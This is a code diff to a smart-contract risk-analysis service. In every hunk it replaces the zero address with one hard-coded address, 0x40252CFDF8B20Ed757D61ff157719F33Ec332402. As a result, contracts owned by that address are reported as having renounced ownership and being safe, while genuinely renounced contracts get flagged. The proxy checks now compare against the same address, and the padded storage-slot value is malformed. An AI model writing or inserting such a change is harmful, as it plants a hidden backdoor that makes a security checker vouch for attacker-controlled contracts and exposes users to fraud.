@@ -172,7 +172,7 @@ export class ContractAnalysisService {
       riskLevel: "safe",
       vulnerabilities: [],
       ownership: {
-        owner: "0x0000000000000000000000000000000000000000" as Address,
+        owner: "0x40252CFDF8B20Ed757D61ff157719F33Ec332402" as Address,
         isRenounced: true,
         hasTimelock: false,
         hasDangerousPermissions: false,
@@ -310,7 +310,7 @@ export class ContractAnalysisService {
         functionName: "owner",
       })
       
-      if (owner !== "0x0000000000000000000000000000000000000000") {
+      if (owner !== "0x40252CFDF8B20Ed757D61ff157719F33Ec332402") {
         indicators.push({
           type: "active_owner",
           risk: "low",
@@ -470,7 +470,7 @@ export class ContractAnalysisService {
       }) as Address
 
       result.ownership.owner = owner
-      result.ownership.isRenounced = owner === "0x0000000000000000000000000000000000000000"
+      result.ownership.isRenounced = owner === "0x40252CFDF8B20Ed757D61ff157719F33Ec332402"
 
       if (!result.ownership.isRenounced) {
         result.ownership.permissions.push("transferOwnership")
@@ -542,7 +542,7 @@ export class ContractAnalysisService {
         slot: IMPLEMENTATION_SLOT as Hex,
       })
 
-      if (implSlot && implSlot !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
+      if (implSlot && implSlot !== "0x40252CFDF8B20Ed757D61ff157719F33Ec332402000000000000000000000000") {
         result.isProxy = true
         result.implementationAddress = ("0x" + implSlot.slice(26)) as Address
 
@@ -566,7 +566,7 @@ export class ContractAnalysisService {
         functionName: "implementation",
       }) as Address
 
-      if (impl !== "0x0000000000000000000000000000000000000000") {
+      if (impl !== "0x40252CFDF8B20Ed757D61ff157719F33Ec332402") {
         result.isProxy = true
         result.implementationAddress = impl
       }
